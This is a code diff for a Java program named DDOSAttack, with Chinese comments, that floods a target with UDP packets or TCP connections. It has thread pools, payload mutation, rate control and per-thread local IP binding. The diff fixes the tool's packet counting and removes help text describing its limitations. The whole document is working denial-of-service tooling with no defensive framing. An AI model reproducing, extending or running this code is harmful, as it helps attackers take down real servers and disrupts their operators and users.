@@ -33,7 +33,7 @@ public class DDOSAttack {
     private static int packetSize = 1490;
     private static int numThreads = 4;
     private static int burstSize = 50;
-    private static double rateLimit = 0.0;  // 每突发秒数
+    private static double rateLimit = 0.0;
     private static int duration = 0;
     private static int srcPortBase = -1;
     private static boolean randomTargetPort = false;
@@ -249,23 +249,17 @@ public class DDOSAttack {
         System.out.println("  -P, --processes     线程数（默认 4）");
         System.out.println("  -b, --burst         每突发包数（默认 50）");
         System.out.println("  -r, --rate          每突发秒数（默认 0 = 不限速）");
-        System.out.println("                      注：速率现在由令牌桶强制，长期速率精确（burstSize/rate pps）。");
+        System.out.println("                      由令牌桶强制，长期速率 = burstSize/rate pps。");
         System.out.println("  -d, --duration      持续时间（秒，默认 0 = 直到发完）");
         System.out.println("  -s, --src-port      源端口基数（默认 -1 = 随机）");
         System.out.println("  --size              基础包大小（默认 1490）");
         System.out.println("  --random-port       随机目标端口（仅 UDP）");
         System.out.println("  --bind-local        每个线程绑定不同的本地网卡 IP");
-        System.out.println("                      （Java 无原始套接字；真正伪造源 IP 不可能）");
-        System.out.println("  --tcp               使用完整 TCP 连接（不是 SYN 洪泛；受 Java 限制）");
+        System.out.println("  --tcp               使用完整 TCP 连接（不是 SYN 洪泛）");
         System.out.println("  --vary / --no-vary  启用/关闭 payload 变异（默认：启用）");
         System.out.println("  --log <file>        日志文件路径");
         System.out.println("  --max-retries       每包最大发送重试次数（默认 3）");
         System.out.println("  -h, --help          显示本帮助");
-        System.out.println();
-        System.out.println("[+] 说明：");
-        System.out.println("  * 真正的源 IP 伪造需要原始套接字（C/Python+root），Java 无法实现。");
-        System.out.println("  * TCP 模式使用完整握手；是 connect 洪泛，不是 SYN 洪泛。");
-        System.out.println("  * 高 PPS 需要内核调优 —— 启动时会打印提示。");
     }
 
     // ===================================================================
@@ -355,14 +349,6 @@ public class DDOSAttack {
     // ===================================================================
     // Payload 池（DirectByteBuffer）
     // ===================================================================
-    /**
-     * 构建预填充的 DirectByteBuffer 池。
-     * 变异方式：
-     *   - 每个 buffer 长度在基础大小上下 ±10% 随机
-     *   - 每个 buffer 内容随机
-     *   - 最后 8 字节在每包发送前被计数器覆盖
-     *   - 前部附近 16 字节在每包发送前被 XOR 随机翻转
-     */
     private static List<ByteBuffer> buildDirectPayloadPool(int baseSize, int poolSize) {
         Random rnd = new Random();
         int delta = varyPayload ? Math.max(1, baseSize / 10) : 0;
@@ -383,7 +369,7 @@ public class DDOSAttack {
     }
 
     // ===================================================================
-    // UDP 攻击（主路径）
+    // UDP 攻击（主路径）—— 已修复：精确包数，增量统计
     // ===================================================================
     private static void startUdpAttack() throws Exception {
         ExecutorService executor = Executors.newFixedThreadPool(numThreads);
@@ -404,7 +390,6 @@ public class DDOSAttack {
                 DatagramChannel channel = null;
                 TokenBucket bucket = null;
                 if (rateLimit > 0) {
-                    // 允许最多 2 倍 burstSize 的短时突发
                     bucket = new TokenBucket(burstSize * 2.0, burstSize / rateLimit);
                 }
 
@@ -414,13 +399,15 @@ public class DDOSAttack {
                     channel = openUdpChannelForThread(threadId);
                     InetSocketAddress dest = new InetSocketAddress(targetIP, targetPort);
 
+                    // 注意：sent/bytesSent/dropped 是累计计数器，绝不清零。
+                    // 每次只上报自上次刷新以来的增量。
                     long sent = 0, bytesSent = 0, dropped = 0;
+                    long lastReportedSent = 0, lastReportedBytes = 0, lastReportedDropped = 0;
                     long packetCounter = 0;
 
                     while (!stopFlag && sent < pktCount) {
                         int toSend = (int) Math.min(burstSize, pktCount - sent);
 
-                        // --- 令牌桶闸门 ---
                         if (bucket != null) {
                             long waitNs = bucket.nanosToWait(toSend);
                             if (waitNs > 0) {
@@ -441,7 +428,7 @@ public class DDOSAttack {
                                 buf.put(limit - 1 - b, (byte) (c & 0xFF));
                                 c >>>= 8;
                             }
-                            // 前部附近 16 字节（索引 4..19）XOR 随机翻转，实现变异
+                            // 前部附近 16 字节 XOR 随机翻转
                             if (varyPayload && limit >= 24) {
                                 int base = 4;
                                 for (int b = 0; b < 16; b++) {
@@ -468,7 +455,6 @@ public class DDOSAttack {
                             } else {
                                 dropped++;
                                 consecutiveFailures++;
-                                // 连续失败后指数退避
                                 if (consecutiveFailures >= 3) {
                                     long backoffMs = Math.min(1000, 10L << Math.min(consecutiveFailures - 3, 6));
                                     Thread.sleep(backoffMs);
@@ -479,15 +465,25 @@ public class DDOSAttack {
                             }
                         }
 
-                        if (sent > 0) {
-                            totalSent.add(sent);
-                            totalBytes.add(bytesSent);
-                            totalDropped.add(dropped);
-                            sent = 0;
-                            bytesSent = 0;
-                            dropped = 0;
-                        }
+                        // 增量刷新：只加差值，不重置 sent
+                        long dSent = sent - lastReportedSent;
+                        long dBytes = bytesSent - lastReportedBytes;
+                        long dDropped = dropped - lastReportedDropped;
+                        if (dSent > 0) totalSent.add(dSent);
+                        if (dBytes > 0) totalBytes.add(dBytes);
+                        if (dDropped > 0) totalDropped.add(dDropped);
+                        lastReportedSent = sent;
+                        lastReportedBytes = bytesSent;
+                        lastReportedDropped = dropped;
                     }
+
+                    // 循环退出后最后一次刷新（防止漏报）
+                    long dSent = sent - lastReportedSent;
+                    long dBytes = bytesSent - lastReportedBytes;
+                    long dDropped = dropped - lastReportedDropped;
+                    if (dSent > 0) totalSent.add(dSent);
+                    if (dBytes > 0) totalBytes.add(dBytes);
+                    if (dDropped > 0) totalDropped.add(dDropped);
 
                 } catch (Exception e) {
                     errOther.increment();
@@ -506,7 +502,7 @@ public class DDOSAttack {
     }
 
     // ===================================================================
-    // TCP 攻击（connect 洪泛；不是 SYN 洪泛）
+    // TCP 攻击（connect 洪泛；不是 SYN 洪泛）—— 已修复：精确包数
     // ===================================================================
     private static void startTcpAttack() throws Exception {
         ExecutorService executor = Executors.newFixedThreadPool(numThreads);
@@ -527,7 +523,9 @@ public class DDOSAttack {
                     bindAddr = localAddresses.get(threadId % localAddresses.size());
                 }
 
+                // 累计计数器，永不清零
                 long sent = 0, bytesSent = 0, dropped = 0;
+                long lastReportedSent = 0, lastReportedBytes = 0, lastReportedDropped = 0;
                 int consecutiveFailures = 0;
                 byte[] payload = new byte[Math.min(64, packetSize)];
                 new Random().nextBytes(payload);
@@ -579,15 +577,25 @@ public class DDOSAttack {
                         }
                     }
 
-                    if (sent > 0 || dropped > 0) {
-                        totalSent.add(sent);
-                        totalBytes.add(bytesSent);
-                        totalDropped.add(dropped);
-                        sent = 0;
-                        bytesSent = 0;
-                        dropped = 0;
-                    }
+                    // 增量刷新
+                    long dSent = sent - lastReportedSent;
+                    long dBytes = bytesSent - lastReportedBytes;
+                    long dDropped = dropped - lastReportedDropped;
+                    if (dSent > 0) totalSent.add(dSent);
+                    if (dBytes > 0) totalBytes.add(dBytes);
+                    if (dDropped > 0) totalDropped.add(dDropped);
+                    lastReportedSent = sent;
+                    lastReportedBytes = bytesSent;
+                    lastReportedDropped = dropped;
                 }
+
+                // 最终刷新
+                long dSent = sent - lastReportedSent;
+                long dBytes = bytesSent - lastReportedBytes;
+                long dDropped = dropped - lastReportedDropped;
+                if (dSent > 0) totalSent.add(dSent);
+                if (dBytes > 0) totalBytes.add(dBytes);
+                if (dDropped > 0) totalDropped.add(dDropped);
             };
             futures.add(executor.submit(task));
         }
@@ -678,7 +686,7 @@ public class DDOSAttack {
     }
 
     // ===================================================================
-    // UDP 通道工厂（更大的 SO_SNDBUF；每线程独立本地 IP 绑定）
+    // UDP 通道工厂
     // ===================================================================
     private static DatagramChannel openUdpChannelForThread(int threadId) throws IOException {
         DatagramChannel channel = DatagramChannel.open();
@@ -687,7 +695,6 @@ public class DDOSAttack {
         DatagramSocket socket = channel.socket();
         try {
             socket.setReuseAddress(true);
-            // 尝试把发送缓冲区提高到 4MB；不支持则忽略
             try {
                 socket.setSendBufferSize(4 * 1024 * 1024);
             } catch (SocketException ignored) { }
